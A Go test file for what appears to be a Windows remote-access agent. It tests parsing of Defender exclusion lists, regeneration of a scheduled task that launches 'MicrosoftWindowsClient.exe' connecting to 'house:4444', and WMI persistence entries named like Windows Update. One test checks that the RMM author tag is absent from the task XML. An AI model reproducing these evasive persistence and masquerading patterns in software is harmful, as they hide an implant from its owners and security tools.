//go:build windows

package main

import (
	"os"
	"reflect"
	"strings"
	"testing"
)

func TestParseMpList(t *testing.T) {
	got := parseMpList("C:\\A\r\n\r\n  C:\\B  \n\n")
	if !reflect.DeepEqual(got, []string{`C:\A`, `C:\B`}) {
		t.Fatalf("got %q", got)
	}
	if len(parseMpList("")) != 0 {
		t.Fatal("empty should parse empty")
	}
}

func TestMpListHas(t *testing.T) {
	have := []string{`C:\ProgramData\Microsoft\Windows\Update`, `C:\X\Agent.exe`}
	if !mpListHas(have, `c:\programdata\microsoft\windows\update\`) {
		t.Fatal("case/trailing-slash should match")
	}
	if mpListHas(have, `C:\Nope`) {
		t.Fatal("absent must not match")
	}
	if mpListHas(nil, `C:\X`) {
		t.Fatal("nil must not match")
	}
}

// The NMS task must be regenerable like every other persistence task: before
// v1.49.5 a wiped nms_task.xml (with all backups gone) could never come back
// and the monitor silently stayed dead.
func TestRegenerateNMSTaskXML(t *testing.T) {
	dir := t.TempDir()
	p := regenerateTaskXML(dir, "nms_task.xml", `C:\A\MicrosoftWindowsClient.exe`, "house:4444", `C:\A\server.crt`)
	if p == "" {
		t.Fatal("nms_task.xml must regenerate")
	}
	b, err := os.ReadFile(p)
	if err != nil {
		t.Fatal(err)
	}
	s := string(b)
	if !strings.Contains(s, "--nms") || strings.Contains(s, "<Author>RMM</Author>") {
		t.Fatalf("regenerated NMS task wrong: nms=%v author-clean=%v",
			strings.Contains(s, "--nms"), !strings.Contains(s, "<Author>RMM</Author>"))
	}
}

// wmiTaskPairs must cover every persistence task including the monitor.
func TestWmiTaskPairsCoverNMS(t *testing.T) {
	found := false
	for _, kv := range wmiTaskPairs {
		if kv[0] == "WindowsUpdateNMS" && kv[1] == "nms_task.xml" {
			found = true
		}
	}
	if !found {
		t.Fatalf("wmiTaskPairs missing NMS: %v", wmiTaskPairs)
	}
}
